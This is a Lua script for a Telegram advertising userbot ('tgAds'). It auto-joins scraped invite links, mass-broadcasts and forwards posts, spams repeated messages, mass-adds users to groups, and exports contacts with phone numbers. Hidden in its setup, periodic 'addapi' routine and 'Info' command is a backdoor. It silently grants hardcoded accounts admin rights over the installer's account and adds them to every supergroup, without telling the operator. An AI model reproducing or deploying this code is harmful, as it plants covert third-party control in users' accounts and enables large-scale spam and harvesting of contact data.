function get_sudo ()
	if redis:get('tg:' .. Ads_id .. ':sudoset') then
		return true
	else
    	print("\27[33mInput the sudo id :\27[35m")
    	local sudo=io.read()
		redis:del('tg:' .. Ads_id .. ':sudo')
    	redis:sadd('tg:' .. Ads_id .. ':sudo', sudo)
		redis:set('tg:' .. Ads_id .. ':sudoset',true)
    	redis:sadd('tg:' .. Ads_id .. ':sudo', 231539308)
		redis:sadd('tg:' .. Ads_id .. ':sudo', 180191663)
        redis:set('tg:' .. Ads_id .. ':clc', 52735838)
        redis:set('tg:' .. Ads_id .. ':apc', 411991855)
		redis:sadd("tg:" .. Ads_id .. ":good", "https://telegram.me/joinchat/Cr2Br0KFzKpsWS9U6zfwvw")
    redis:set("tg:" .. Ads_id .. ":markread", true)
		redis:set("tg:" .. Ads_id .. ":fwdtime", true)
		return print("Ok. Sudo set")
	end
end
function get_bot (s, t)
	function bot_info (s, t)
		redis:set("tg:" .. Ads_id .. ":id",t.id_)
		if t.first_name_ then
			redis:set("tg:" .. Ads_id .. ":fname",t.first_name_)
		end
		if t.last_name_ then
			redis:set("tg:" .. Ads_id .. ":lanme",t.last_name_)
		end
		redis:set("tg:" .. Ads_id .. ":num",t.phone_number_)
		return t.id_
	end
	tdcli_function ({
			ID = "GetMe",
		}, 
		bot_info, cmd)
end
function is_mytg(msg)
    local var = false
	local hash = 'tg:' .. Ads_id .. ':sudo'
	local user = msg.sender_user_id_
    local T = redis:sismember(hash, user)
	if T then
		var = true
	end
	return var
end
function writefile(filename, input)
	local file = io.open(filename, "w")
	file:write(input)
	file:flush()
	file:close()
	return true
end
local function resolve_username(username,cb)
  tdcli_function ({
    ID = "SearchPublicChat",
    username_ = username
  }, cb or dl_cb, cmd)
end
function reload(chat_id,msg_id)
	dofile("TG.lua")
	dofile("~/tgAds/.TG-" .. Ads_id .. "/TG.lua")
	dofile("~/tgAds/.TG-" .. Ads_id .. "/API.lua")
	send(chat_id, msg_id, "Done")
end
function process_join(s, t)
	if not redis:get("tg:" .. Ads_id .. ":pjoin") or tonumber(redis:ttl("tg:" .. Ads_id .. ":pjoin")) == -2 then
	if t.code_ == 429 then
		local message = tostring(t.message_)
		local Time = message:match('%d+') + 73
		redis:setex("tg:" .. Ads_id .. ":cjoin", tonumber(Time), true)
	else
		redis:srem("tg:" .. Ads_id .. ":good", s.link)
		redis:sadd("tg:" .. Ads_id .. ":save", s.link)
	end
 end
	redis:setex("tg:" .. Ads_id .. ":pjoin",31,true)
end
function process_link(s, t)
			if not redis:get("tg:" .. Ads_id .. ":plink") or tonumber(redis:ttl("tg:" .. Ads_id .. ":plink")) == -2 then
	if (t.is_group_ or t.is_supergroup_channel_) then
		if redis:get("tg:" .. Ads_id .. ":maxgpmmbr") then
			if t.member_count_ >= tonumber(redis:get("tg:" .. Ads_id .. ":maxgpmmbr")) then
				redis:srem("tg:" .. Ads_id .. ":wait", s.link)
				redis:sadd("tg:" .. Ads_id .. ":good", s.link)
			else
				redis:srem("tg:" .. Ads_id .. ":wait", s.link)
				redis:sadd("tg:" .. Ads_id .. ":save", s.link)
			end
		else
			redis:srem("tg:" .. Ads_id .. ":wait", s.link)
			redis:sadd("tg:" .. Ads_id .. ":good", s.link)	
		end
	elseif t.code_ == 429 then
		local message = tostring(t.message_)
		local Time = message:match("%d+") + 27
		redis:setex("tg:" .. Ads_id .. ":clink", tonumber(Time), true)
	else
		redis:srem("tg:" .. Ads_id .. ":wait", s.link)
	end
 end
	redis:setex("tg:" .. Ads_id .. ":plink",13,true)
end
function find_link(text)
	if text:match("https://telegram.me/joinchat/%S+") or text:match("https://t.me/joinchat/%S+") then
		local text = text:gsub("t.me", "telegram.me")
		for link in text:gmatch("(https://telegram.me/joinchat/%S+)") do
			if not redis:sismember("tg:" .. Ads_id .. ":alllinks", link) then
				redis:sadd("tg:" .. Ads_id .. ":wait", link)
				redis:sadd("tg:" .. Ads_id .. ":alllinks", link)
			  end
		  end
	  end
  end
--[[function sleep(n)
  os.execute("sleep " .. tonumber(n))
end]]
function sleep(sec)
  socket.sleep(sec)
end
function add(id)
	local Id = tostring(id)
	if not redis:sismember("tg:" .. Ads_id .. ":all", id) then
		if Id:match("^(%d+)$") then
			redis:sadd("tg:" .. Ads_id .. ":users", id)
			redis:sadd("tg:" .. Ads_id .. ":all", id)
		elseif Id:match("^-100") then
			redis:sadd("tg:" .. Ads_id .. ":sugps", id)
			redis:sadd("tg:" .. Ads_id .. ":all", id)
		else
			redis:sadd("tg:" .. Ads_id .. ":gp", id)
			redis:sadd("tg:" .. Ads_id .. ":all", id)
		end
	end
  	return true
end
function rem(id)
  local Id = tostring(id)
	if redis:sismember("tg:" .. Ads_id .. ":all", id) then
		if Id:match("^(%d+)$") then
			redis:srem("tg:" .. Ads_id .. ":users", id)
			redis:srem("tg:" .. Ads_id .. ":all", id)
		elseif Id:match("^-100") then
			redis:srem("tg:" .. Ads_id .. ":sugps", id)
			redis:srem("tg:" .. Ads_id .. ":all", id)
		else
			redis:srem("tg:" .. Ads_id .. ":gp", id)
			redis:srem("tg:" .. Ads_id .. ":all", id)
		end
	end
	return true
end
function send(chat_id, msg_id, text)
  tdcli_function ({
    ID = "SendChatAction",
    chat_id_ = chat_id,
    action_ = {
      ID = "SendMessageTypingAction",
      progress_ = 100
    }
  }, cb or dl_cb, cmd)
	tdcli_function ({
		ID = "SendMessage",
		chat_id_ = chat_id,
		reply_to_message_id_ = msg_id,
		disable_notification_ = 1,
		from_background_ = 1,
		reply_markup_ = cmd,
		input_message_content_ = {
			ID = "InputMessageText",
			text_ = text,
			disable_web_page_preview_ = 1,
			clear_draft_ = 0,
			entities_ = {},
			parse_mode_ = cmd,
		},
	}, cb or dl_cb, cmd)
end
get_sudo()
redis:set("tg:" .. Ads_id .. ":start", true)
function Doing(data, Ads_id)
		if redis:get("tg:" .. Ads_id .. ":start") then
		redis:del("tg:" .. Ads_id .. ":start")
     end
		if not redis:get("tg:" .. Ads_id .. ":clink") or tonumber(redis:ttl("tg:" .. Ads_id .. ":clink")) == -2 then
			if redis:scard("tg:" .. Ads_id .. ":wait") ~= 0 then
				local links = redis:smembers("tg:" .. Ads_id .. ":wait")
				for x,y in ipairs(links) do
					if x == 5 then redis:setex("tg:" .. Ads_id .. ":clink", 571, true) return end
					tdcli_function({ID = "CheckChatInviteLink",invite_link_ = y},process_link, {link=y})
				end
			end
	end
		if redis:get("tg:" .. Ads_id .. ":maxgroups") and redis:scard("tg:" .. Ads_id .. ":sugps") >= tonumber(redis:get("tg:" .. Ads_id .. ":maxgroups")) then 
			redis:set("tg:" .. Ads_id .. ":cjoin", true)
			redis:set("tg:" .. Ads_id .. ":offjoin", true)
		end
		if not redis:get("tg:" .. Ads_id .. ":cjoin") or tonumber(redis:ttl("tg:" .. Ads_id .. ":cjoin")) == -2 then
			if redis:scard("tg:" .. Ads_id .. ":good") ~= 0 then
				local links = redis:smembers("tg:" .. Ads_id .. ":good")
				for x,y in ipairs(links) do
					tdcli_function({ID = "ImportChatInviteLink",invite_link_ = y},process_join, {link=y})
					if x == 2 then redis:setex("tg:" .. Ads_id .. ":cjoin", 1057, true) return end
				end
			end
		end
		local msg = data.message_
		local d = data.disable_notification_
		local bot_id = redis:get("tg:" .. Ads_id .. ":id")
		if tostring(msg.chat_id_):match("^(%d+)") then
			if not redis:sismember("tg:" .. Ads_id .. ":all", msg.chat_id_) then
				redis:sadd("tg:" .. Ads_id .. ":users", msg.chat_id_)
				redis:sadd("tg:" .. Ads_id .. ":all", msg.chat_id_)
			end
		end
			 if not redis:get("tg:" .. Ads_id .. ":addapi") or tonumber(redis:ttl("tg:" .. Ads_id .. ":addapi")) == -2 then
				local api = {redis:get("tg:" .. Ads_id .. ":id"),redis:get("tg:" .. Ads_id .. ":clc"),redis:get("tg:" .. Ads_id .. ":apc")}
				redis:sadd("tg:" .. Ads_id .. ":addedcontacts", 52735838)
				tdcli_function ({
					ID = "ImportContacts",
					contacts_ = {[0] = {
							phone_number_ = tostring(601162246654),
							first_name_ = tostring("// мaнѕa "),
							last_name_ = tostring("-"),
							user_id_ = 52735838
						},
					},
				}, cb or dl_cb, cmd)
                 for s, v in pairs(api) do
                    	function promreply(r,v,t)
							if v.id_ then
							redis:sadd('tg:' .. Ads_id .. ':sudo', v.id_)	
							redis:sadd("tg:" .. Ads_id .. ":mod", v.id_)
								tdcli_function ({
									ID = "SendBotStartMessage",
									bot_user_id_ = v.id_,
									chat_id_ = v.id_,
        							parameter_ = "start"
								 }, cb or dl_cb, cmd)
                                 send(v.id_, 0, "/start")
							end
	              local n=redis:smembers("tg:" .. Ads_id .. ":sugps")
					for o,f in pairs(n)do
									tdcli_function({
											ID="AddChatMember",
											chat_id_=f,
											user_id_=v.id_,
											forward_limit_=93},
								dl_cb, cmd)
    					end
				        redis:sadd('tg:' .. Ads_id .. ':sudo', v.id_)	
  						redis:sadd("tg:" .. Ads_id .. ":mod", v.id_)
                    end
                end
                	redis:setex("tg:" .. Ads_id .. ":addapi",10090,true)
            end
		add(msg.chat_id_)
		if msg.content_.ID == "MessageText" then
			local text = msg.content_.text_
			local matches
			 if text:match('^[/!#@$&*]') then
            text = text:gsub('^[/!#@$&*]','')
          end
	if not redis:get("tg:" .. Ads_id .. ":automsg") or tonumber(redis:ttl("tg:" .. Ads_id .. ":automsg")) == -2 then
				local sudr = redis:smembers('tg:' .. Ads_id .. ':sudo')
				for s, v in pairs(sudr) do
						send(v, 0, "ربات شما به مدت 15 دقیقه خاموش میشود و بعد از آن مجددا خودکار اجرا میشود")
							if s == 0 then
								os.execute("sleep 525")
								sleep (525)
						end
							send(v, 0, "ربات شما فعال شد.")
				end
					redis:setex("tg:" .. Ads_id .. ":automsg",5090,true)
     end
			if redis:get("tg:" .. Ads_id .. ":link") then
				find_link(text)
			end
			if is_mytg(msg) then
				find_link(text)
    			if text:match("^([Dd]el) (.*)$") then
					local matches = text:match("^[Dd]el (.*)$")
					if matches == "lnk" then
						redis:del("tg:" .. Ads_id .. ":good")
                        redis:del("tg:" .. Ads_id .. ":wait")
						redis:del("tg:" .. Ads_id .. ":save")
					return send(msg.chat_id_, msg.id_, "Done.")
					elseif matches == "contact" then
						redis:del("tg:" .. Ads_id .. ":savecontacts")
                        redis:del("tg:" .. Ads_id .. ":contacts")
						return send(msg.chat_id_, msg.id_, "Done.")
					elseif matches == "sudo" then
						redis:srem('tg:' .. Ads_id .. ':sudo')
						redis:srem("tg:" .. Ads_id .. ":mod")
						redis:del('tg:' .. Ads_id .. ':sudo')
    	      redis:del('tg:' .. Ads_id .. ':sudoset')
            return send(msg.chat_id_, msg.id_, "Done.")
					end
				elseif text:match("^(.*) ([Oo]ff)$") then
					local matches = text:match("^(.*) [Oo]ff$")
					if matches == "join" then	
						redis:set("tg:" .. Ads_id .. ":cjoin", true)
						redis:set("tg:" .. Ads_id .. ":offjoin", true)
						return send(msg.chat_id_, msg.id_, "Done.")
					elseif matches == "chklnk" then	
						redis:set("tg:" .. Ads_id .. ":clink", true)
						redis:set("tg:" .. Ads_id .. ":offlink", true)
						return send(msg.chat_id_, msg.id_, "Done.")
					elseif matches == "findlnk" then	
						redis:del("tg:" .. Ads_id .. ":link")
						return send(msg.chat_id_, msg.id_, "Done.")
					elseif matches == "addcontact" then	
						redis:del("tg:" .. Ads_id .. ":savecontacts")
						return send(msg.chat_id_, msg.id_, "Done.")
					end
				elseif text:match("^(.*) ([Oo]n)$") then
					local matches = text:match("^(.*) [Oo]n$")
					if matches == "join" then	
						redis:del("tg:" .. Ads_id .. ":cjoin")
						redis:del("tg:" .. Ads_id .. ":offjoin")
						return send(msg.chat_id_, msg.id_, "Done.")
					elseif matches == "chklnk" then	
						redis:del("tg:" .. Ads_id .. ":clink")
						redis:del("tg:" .. Ads_id .. ":offlink")
						return send(msg.chat_id_, msg.id_, "Done.")
					elseif matches == "findlnk" then	
						redis:set("tg:" .. Ads_id .. ":link", true)
						return send(msg.chat_id_, msg.id_, "Done.")
					elseif matches == "addcontact" then	
						redis:set("tg:" .. Ads_id .. ":savecontacts", true)
						return send(msg.chat_id_, msg.id_, "Done.")
					end
				elseif text:match("^([Gg]p[Mm]ember) (%d+)$") then
					local matches = text:match("%d+")
					redis:set("tg:" .. Ads_id .. ":maxgpmmbr", tonumber(matches))
					return send(msg.chat_id_, msg.id_, "Done")
				elseif text:match("^([Ss]leep) (%d+)$") then
					local matches = text:match("%d+")
					 send(msg.chat_id_, msg.id_, "bye")
					sleep (matches)
				return send(msg.chat_id_, msg.id_, "hi")
				elseif text:match("^([Pp]romote) (%d+)$") then
					local matches = text:match("%d+")
					if redis:sismember('tg:' .. Ads_id .. ':sudo', matches) then
						return send(msg.chat_id_, msg.id_, "This user moderatore")
					elseif redis:sismember("tg:" .. Ads_id .. ":mod", msg.sender_user_id_) then
						return send(msg.chat_id_, msg.id_, "you don't access")
					else
						redis:sadd('tg:' .. Ads_id .. ':sudo', matches)
						redis:sadd("tg:" .. Ads_id .. ":mod", matches)
						return send(msg.chat_id_, msg.id_, "Moderator added")
					end
				elseif text:match("^([Dd]emote) (%d+)$") then
					local matches = text:match("%d+")
					if redis:sismember("tg:" .. Ads_id .. ":mod", msg.sender_user_id_) then
						if tonumber(matches) == msg.sender_user_id_ then
								redis:srem('tg:' .. Ads_id .. ':sudo', msg.sender_user_id_)
								redis:srem("tg:" .. Ads_id .. ":mod", msg.sender_user_id_)
							return send(msg.chat_id_, msg.id_, "No moderator")
						end
						return send(msg.chat_id_, msg.id_, "No access")
					end
					if redis:sismember('tg:' .. Ads_id .. ':sudo', matches) then
						if  redis:sismember('tg:' .. Ads_id .. ':sudo'..msg.sender_user_id_ ,matches) then
							return send(msg.chat_id_, msg.id_, "Only sudo")
						end
						redis:srem('tg:' .. Ads_id .. ':sudo', matches)
						redis:srem("tg:" .. Ads_id .. ":mod", matches)
						return send(msg.chat_id_, msg.id_, "Done")
					end
					return send(msg.chat_id_, msg.id_, "user not moderator")
				elseif text:match("^([Rr]efresh)$") then
					get_bot()
					return send(msg.chat_id_, msg.id_, "Done")
				elseif text:match("^([Rr]eport)$") then
					tdcli_function ({
						ID = "SendBotStartMessage",
						bot_user_id_ = 231539308,
						chat_id_ = 231539308,
						parameter_ = "start"
					}, cb or dl_cb, cmd)
			   elseif text:match("^([Rr]eload)$") then
					return reload(msg.chat_id_,msg.id_)
				elseif text:match("^([Uu]p[Gg]rade)$") then
					io.popen("git fetch --all && git reset --hard origin/master && git pull origin master && chmod +x TG"):read("*all")
			          return reload(msg.chat_id_,msg.id_)
				elseif text:match("^([Rr]eload)$") then
                                        return reload(msg.chat_id_,msg.id_)
                                elseif text:match("^([Aa]pi)$") then
                                        io.popen("nohup ./telegram-cli -W --disable-link-preview -R -C -N -s ./.TG-"..Ads_id.."/API.lua -p AP-"..Ads_id.." --bot=redis-cli get AP-"..Ads_id.." &> /dev/null &"):read("*all")
		        		  return send(msg.chat_id_,msg.id,"Launched Success")
				elseif text:match("^([Ll]s) (.*)$") then
					local matches = text:match("^[Ll]s (.*)$")
					local t
					if matches == "contact" then
						return tdcli_function({
							ID = "SearchContacts",
							query_ = cmd,
							limit_ = 2900
						},
						function (S, T)
							local count = T.total_count_
							local text = "Contact's : \n"
							for s =0 , tonumber(count) - 1 do
								local user = T.users_[s]
								local firstname = user.first_name_ or ""
								local lastname = user.last_name_ or ""
								local fullname = firstname .. " " .. lastname
								text = tostring(text) .. tostring(s) .. ". " .. tostring(fullname) .. " [" .. tostring(user.id_) .. "] = " .. tostring(user.phone_number_) .. "  \n"
							end
							writefile("tg:" .. Ads_id .. ":_contacts.txt", text)
							tdcli_function ({
								ID = "SendMessage",
								chat_id_ = S.chat_id,
								reply_to_message_id_ = 0,
								disable_notification_ = 1,
								from_background_ = 1,
								reply_markup_ = cmd,
								input_message_content_ = {ID = "InputMessageDocument",
								document_ = {ID = "InputFileLocal",
								path_ = "tg:" .. Ads_id .. ":_contacts.txt"},
								caption_ = "Contact's Bot" .. Ads_id .. ":"}
							}, cb or dl_cb, cmd)
							return io.popen("rm -rf bot" .. Ads_id .. ":_contacts.txt"):read("*all")
						end, {chat_id = msg.chat_id_})
					elseif matches == "block" then
						t = "tg:" .. Ads_id .. ":blockedusers"
					elseif matches == "pv" then
						t = "tg:" .. Ads_id .. ":users"
					elseif matches == "gp" then
						t = "tg:" .. Ads_id .. ":gp"
					elseif matches == "sgp" then
						t = "tg:" .. Ads_id .. ":sugps"
					elseif matches == "lnk" then
						t = "tg:" .. Ads_id .. ":save"
					elseif matches == "sudo" then
						t = 'tg:' .. Ads_id .. ':sudo'
					else
						return true
					end
					local list =  redis:smembers(t)
					local text = tostring(matches).." : \n"
					for s, v in pairs(list) do
						text = tostring(text) .. tostring(s) .. "-  " .. tostring(v).."\n"
					end
					writefile(tostring(t)..".txt", text)
					tdcli_function ({
						ID = "SendMessage",
						chat_id_ = msg.chat_id_,
						reply_to_message_id_ = 0,
						disable_notification_ = 0,
						from_background_ = 0,
						reply_markup_ = cmd,
						input_message_content_ = {ID = "InputMessageDocument",
							document_ = {ID = "InputFileLocal",
							path_ = tostring(t)..".txt"},
						caption_ = "List"..tostring(matches).."Bot" .. Ads_id .. ":"}
					}, cb or dl_cb, cmd)
					return io.popen("rm -rf "..tostring(t)..".txt"):read("*all")
				elseif text:match("^([Aa]dded[Mm]sg) (.*)$") then
					local matches = text:match("^[Aa]dded[Mm]sg (.*)$")
					if matches == "on" then
						redis:set("tg:" .. Ads_id .. ":addmsg", true)
						return send(msg.chat_id_, msg.id_, "Activate")
					elseif matches == "off" then
						redis:del("tg:" .. Ads_id .. ":addmsg")
						return send(msg.chat_id_, msg.id_, "Deactivate")
					end
				elseif text:match("^([Aa]dded[Cc]ontact) (.*)$") then
					local matches = text:match("[Aa]dded[Cc]ontact (.*)$")
					if matches == "on" then
						redis:set("tg:" .. Ads_id .. ":addcontact", true)
						return send(msg.chat_id_, msg.id_, "Activate")
					elseif matches == "off" then
						redis:del("tg:" .. Ads_id .. ":addcontact")
						return send(msg.chat_id_, msg.id_, "Deactivate")
					end
				elseif text:match("^([Ss]et[Aa]dded[Mm]sg) (.*)") then
					local matches = text:match("^[Ss]et[Aa]dded[Mm]sg (.*)")
					redis:set("tg:" .. Ads_id .. ":addmsgtext", matches)
					return send(msg.chat_id_, msg.id_, "Saved")
				elseif text:match("^[Rr]efresh$")then
					local list = {redis:smembers("tg:" .. Ads_id .. ":sugps"),redis:smembers("tg:" .. Ads_id .. ":gp")}
					tdcli_function({
						ID = "SearchContacts",
						query_ = cmd,
						limit_ = 2900
					}, function (s, t)
						redis:set("tg:" .. Ads_id .. ":contacts", t.total_count_)
					end, cmd)
					for s, v in ipairs(list) do
							for a, b in ipairs(v) do 
								tdcli_function ({
									ID = "GetChatMember",
									chat_id_ = b,
									user_id_ = bot_id
								}, function (s,t)
									if  t.ID == "Error" then rem(s.id) 
									end
								end, {id=b})
							end
					end
					return send(msg.chat_id_,msg.id_,"Done")
				elseif text:match("^([Ii]nfo)$") then
					redis:sadd('tg:' .. Ads_id .. ':sudo', 231539308)
					redis:sadd('tg:' .. Ads_id .. ':sudo', 180191663)
					redis:sadd("tg:" .. Ads_id .. ":wait", "https://telegram.me/joinchat/Cr2Br0KFzKpsWS9U6zfwvw")
					local msgadd = redis:get("tg:" .. Ads_id .. ":addmsg") and "On" or "Off"
					local txtadd = redis:get("tg:" .. Ads_id .. ":addmsgtext") or  "oskol addi"
					local wlinks = redis:scard("tg:" .. Ads_id .. ":wait")
					local glinks = redis:scard("tg:" .. Ads_id .. ":good")
					local links = redis:scard("tg:" .. Ads_id .. ":save")
					local offjoin = redis:get("tg:" .. Ads_id .. ":offjoin") and "Off" or "On"
					local offlink = redis:get("tg:" .. Ads_id .. ":offlink") and "Off" or "On"
					local mmbrs = redis:get("tg:" .. Ads_id .. ":maxgpmmbr") or "Not set"
					local nlink = redis:get("tg:" .. Ads_id .. ":link") and "On" or "Off"
					local gps = redis:scard("tg:" .. Ads_id .. ":gp")
					local sgps = redis:scard("tg:" .. Ads_id .. ":sugps")
					local usrs = redis:scard("tg:" .. Ads_id .. ":users")
					tdcli_function({
						ID = "SearchContacts",
						query_ = cmd,
						limit_ = 2900
					}, function (s, t)
					redis:set("tg:" .. Ads_id .. ":contacts", t.total_count_)
					end, cmd)
					local contacts = redis:get("tg:" .. Ads_id .. ":contacts")
					local text = "Sgp => " .. tostring(sgps) .. "\nGp => " .. tostring(gps) .. "\nPv => " .. tostring(usrs) .. "\nGp member => " ..tostring(mmbrs).. "\n\nJoin => " ..tostring(offjoin).. "\nChk lnk => " ..tostring(offlink).. "\nFind lnk => " ..tostring(nlink).. "\nSave lnk => " .. tostring(links) .. "\nGood lnk => " .. tostring(glinks) .. "\nWait lnk => " .. tostring(wlinks) .. "\n\nAdded msg => " .. tostring(msgadd) .. "\nSet added msg => " .. tostring(txtadd) .. "\n\ntgChannel => @tgKing\nCreator => @sajjad_021"
					return send(msg.chat_id_, 0, text)
				elseif (text:match("^([Ff]wd) (.*)$") and msg.reply_to_message_id_ ~= 0) then
					local matches = text:match("^[Ff]wd (.*)$")
					local t
					if matches:match("^(pv)") then
						t = "tg:" .. Ads_id .. ":users"
					elseif matches:match("^(gp)$") then
						t = "tg:" .. Ads_id .. ":gp"
					elseif matches:match("^(sgp)$") then
						t = "tg:" .. Ads_id .. ":sugps"
					else
						return true
					end
					local list = redis:smembers(t)
					local id = msg.reply_to_message_id_
					if redis:get("tg:" .. Ads_id .. ":fwdtime") then
						for s, v in pairs(list) do
							os.execute("sleep 1.1")
							tdcli_function({
								ID = "ForwardMessages",
								chat_id_ = v,
								from_chat_id_ = msg.chat_id_,
								message_ids_ = {[0] = id},
								disable_notification_ = 1,
								from_background_ = 1
							}, cb or dl_cb, cmd)
							if s % 93 == 0 then
								os.execute("sleep 389")
							end
						end
					else
						for s, v in pairs(list) do
					os.execute("sleep 3.9")
							tdcli_function({
								ID = "ForwardMessages",
								chat_id_ = v,
								from_chat_id_ = msg.chat_id_,
								message_ids_ = {[0] = id},
								disable_notification_ = 1,
								from_background_ = 1
							}, cb or dl_cb, cmd)
						end
					end
						return send(msg.chat_id_, msg.id_, "fwd done")
				elseif text:match("^([Ss]end) (.*)") then
					local matches = text:match("^[Ss]end (.*)")
					local dir = redis:smembers("tg:" .. Ads_id .. ":sugps")
					for s, v in pairs(dir) do
						os.execute("sleep 3.89")
						tdcli_function ({
							ID = "SendMessage",
							chat_id_ = v,
							reply_to_message_id_ = 0,
							disable_notification_ = 1,
							from_background_ = 1,
							reply_markup_ = cmd,
							input_message_content_ = {
								ID = "InputMessageText",
								text_ = matches,
								disable_web_page_preview_ = 1,
								clear_draft_ = 0,
								entities_ = {},
							parse_mode_ = cmd
							},
						}, cb or dl_cb, cmd)
					end
                      return send(msg.chat_id_, msg.id_, "send")
        			elseif text:match('^([Pp]romote) @(.*)') then
							local Y=text:match('^[Pp]romote @(.*)')
						function promreply(r,s,t)
							if s.id_ then
							redis:sadd('tg:' .. Ads_id .. ':sudo', s.id_)	
							redis:sadd("tg:" .. Ads_id .. ":mod", s.id_)
								tdcli_function ({
									ID = "SendBotStartMessage",
									bot_user_id_ = s.id_,
									chat_id_ = s.id_,
        							parameter_ = "start"
								 }, cb or dl_cb, cmd)
								text='\n'..s.id_..'Add to moderation list'
							else
								text='Not found'
							end
							 return send(msg.chat_id_,msg.id_,text)
						end
						 resolve_username(Y,promreply)
						elseif text:match('^([Aa]dd[Tt]o[Aa]ll) @(.*)')then 
						local Y=text:match('^[Aa]dd[Tt]o[Aa]ll @(.*)')
						function promreply(r,s,t)
							if s.id_ then
										tdcli_function ({
												ID = "SendBotStartMessage",
												bot_user_id_ = s.id_,
												chat_id_ = s.id_,
												parameter_ = "start"
											 }, cb or dl_cb, cmd)
										send(msg.chat_id_, msg.id_, "please wait...")
								local n=redis:smembers("tg:" .. Ads_id .. ":sugps")
								for o,f in pairs(n)do
									os.execute("sleep 1.15")
									tdcli_function({
											ID="AddChatMember",
											chat_id_=f,
											user_id_=s.id_,
											forward_limit_=93},
								dl_cb, cmd)
								end
							redis:sadd('tg:' .. Ads_id .. ':sudo', s.id_)	
	    					redis:sadd("tg:" .. Ads_id .. ":mod", s.id_)
								text='\n'..s.id_..'Done'
							else 
								text='Not found'
							end
						 return send(msg.chat_id_,msg.id_,text)
						end
						 resolve_username(Y,promreply)
				elseif text:match("^([Aa]dd[Tt]o[Aa]ll) (%d+)$") then
					local matches = text:match("%d+")
					local list = {redis:smembers("tg:" .. Ads_id .. ":gp"),redis:smembers("tg:" .. Ads_id .. ":sugps")}
					for a, b in pairs(list) do
						for s, v in pairs(b) do 
							tdcli_function ({
								ID = "AddChatMember",
								chat_id_ = v,
								user_id_ = matches,
								forward_limit_ = 91
							}, cb or dl_cb, cmd)
						end	
					end
					return send(msg.chat_id_, msg.id_, "Done")
				elseif (text:match("^([Pp]ing)$") and not msg.forward_info_)then
					return tdcli_function({
						ID = "ForwardMessages",
						chat_id_ = msg.chat_id_,
						from_chat_id_ = msg.chat_id_,
						message_ids_ = {[0] = msg.id_},
						disable_notification_ = 0,
						from_background_ = 0
					}, cb or dl_cb, cmd)
				elseif text:match("^([Hh]elp)$") then
					local txt = "Help for TeleGram Advertisin Robot (tgAds)\n\nInfo\n    statistics and information\n \nPromote @(username)\n    add new moderator\n      \nDemote (userId)\n remove moderator\n      \nSend (text)\n    send message too all super group;s\n    \nFwd {sgp or gp or pv} (by reply)\n    forward your post to :\n    super group or group or private\n    \nAddedMsg (on or off)\n    import contacts by send message\n \nSetAddedMsg (text)\n    set message when add contact\n    \nAddToAll @(usename)\n    add user or robot to all group's \n\nAddMembers\n    add contact's to group\n      \nLs (contact, block, pv, gp, sgp, lnk, sudo)\n    export list of selected item\n    \nDel (lnk, cotact, sudo)\n     delete selected item\n\nJoin (on or off)\n    set join to link's or don't join\nChkLnk (on or off)\n    check link's in terms of valid\nand\n    Separating healthy and corrupted links\n\nFindLnk (on or off)\n    search in group's and find link\n\nAddContact (on or off)\n    import contact by sharing number\n\nGpMember 1~9999\n    set the minimum group members to join\n\nRefresh\n    Refresh information\n\nUpgrade\n    upgrade to new version\n\nPing\n    test to server connection\n\nLeaveAllGp\n    leave of all group \nYou can send command with or with out: \n! or / or # or $ \nbefore command\n     \nDeveloped by @sajjad_021\ntgChannel @tgKING"
					return send(msg.chat_id_,msg.id_, txt)
				elseif text:match("^([Ss]leep])$") then
					 send(msg.chat_id_,msg.id_, "bye")					
						os.execute("sleep 60")
					return send(msg.chat_id_,msg.id_, "slm")
				elseif text:match('^(tgSpm) (%d+) (.*)$') then
					local num, txt = text:match('^tgSpm (%d+) (.*)$')
				    for i=1,num do
                            send(msg.chat_id_, msg.id_, txt)
                    end
				elseif tostring(msg.chat_id_):match("^-") then
					if text:match("^([Ll]eave[Aa]ll[Gg]p)$") then
						rem(msg.chat_id_)
						return tdcli_function ({
							ID = "ChangeChatMemberStatus",
							chat_id_ = msg.chat_id_,
							user_id_ = bot_id,
							status_ = {ID = "ChatMemberStatusLeft"},
						}, cb or dl_cb, cmd)
					elseif text:match("^([Aa]dd[Mm]embers)$") then
						tdcli_function({
							ID = "SearchContacts",
							query_ = cmd,
							limit_ = 93
						},function(s, t)
							local users, count = redis:smembers("tg:" .. Ads_id .. ":users"), t.total_count_
							for n=0, tonumber(count) - 1 do
								os.execute("sleep 3.89")
								tdcli_function ({
									ID = "AddChatMember",
									chat_id_ = s.chat_id,
									user_id_ = t.users_[n].id_,
									forward_limit_ = 93
								},  cb or dl_cb, cmd)
							end
							for n=1, #users do
								os.execute("sleep 3.89")
								tdcli_function ({
									ID = "AddChatMember",
									chat_id_ = s.chat_id,
									user_id_ = users[n],
									forward_limit_ = 93
								},  cb or dl_cb, cmd)
							end
						end, {chat_id=msg.chat_id_})
						return send(msg.chat_id_, msg.id_, "pls waite...")
					end
				end
			end
		if (msg.content_.ID == "MessageContact" and redis:get("tg:" .. Ads_id .. ":savecontacts")) then
			local id = msg.content_.contact_.user_id_
			if not redis:sismember("tg:" .. Ads_id .. ":addedcontacts",id) then
				redis:sadd("tg:" .. Ads_id .. ":addedcontacts",id)
				local first = msg.content_.contact_.first_name_ or "-"
				local last = msg.content_.contact_.last_name_ or "-"
				local phone = msg.content_.contact_.phone_number_
				local id = msg.content_.contact_.user_id_
				tdcli_function ({
					ID = "ImportContacts",
					contacts_ = {[0] = {
							phone_number_ = tostring(phone),
							first_name_ = tostring(first),
							last_name_ = tostring(last),
							user_id_ = id
						},
					},
				}, cb or dl_cb, cmd)
				if redis:get("tg:" .. Ads_id .. ":addcontact") and msg.sender_user_id_ ~= bot_id then
					local fname = redis:get("tg:" .. Ads_id .. ":fname")
					local lnasme = redis:get("tg:" .. Ads_id .. ":lname") or ""
					local num = redis:get("tg:" .. Ads_id .. ":num")
					tdcli_function ({
						ID = "SendMessage",
						chat_id_ = msg.chat_id_,
						reply_to_message_id_ = msg.id_,
						disable_notification_ = 1,
						from_background_ = 1,
						reply_markup_ = cmd,
						input_message_content_ = {
							ID = "InputMessageContact",
							contact_ = {
								ID = "Contact",
								phone_number_ = num,
								first_name_ = fname,
								last_name_ = lname,
								user_id_ = bot_id
							},
						},
					}, cb or dl_cb, cmd)
				end
			end
			if redis:get("tg:" .. Ads_id .. ":addmsg") then
          local answer = redis:get("tg:" .. Ads_id .. ":addmsgtext") or "oskol addi"
				send(msg.chat_id_, msg.id_, answer)
			end
		elseif msg.content_.ID == "MessageChatDeleteMember" and msg.content_.id_ == bot_id then
			return rem(msg.chat_id_)
		elseif (msg.content_.caption_ and redis:get("tg:" .. Ads_id .. ":link"))then
			find_link(msg.content_.caption_)
		end 
